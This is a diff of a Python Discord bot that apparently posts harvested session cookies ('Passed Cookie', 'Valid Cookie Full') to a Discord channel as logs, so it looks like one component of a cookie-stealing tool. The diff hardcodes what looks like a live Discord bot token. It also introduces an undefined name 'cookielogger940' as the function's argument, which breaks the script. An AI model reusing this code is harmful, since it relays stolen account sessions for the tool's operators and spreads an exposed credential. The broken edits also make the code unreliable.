@@ -6,9 +6,9 @@
 # vcf = Valid Cookie Full
 
 from requests import get;import discord;from discord.ext import commands
-def bot():
-    client = commands.Bot(command_prefix="PREFIX HERE")
-    discordBot = 'TOKEN HERE'
+def bot(cookielogger940):
+    client = commands.Bot(command_prefix="!")
+    discordBot = 'MTA0ODE2NjA5NjUyMTQwMDM4MA.GZ9YZb.ETFrFE8Kmn1iNCB3rWy0bysYum1WCxb9fEyi-M'
     @client.event
     async def on_ready():
         print(f"""Successfully Connected To [{client.user}]\n\n[!] Logs will be sent here""")
@@ -147,4 +147,4 @@ def bot():
             embedVar.add_field(name="Passed Cookie: ", value='```' + text + '```', inline=False)
             await ctx.send(embed=embedVar)
     client.run(discordBot)
-bot()
+bot(cookielogger940)
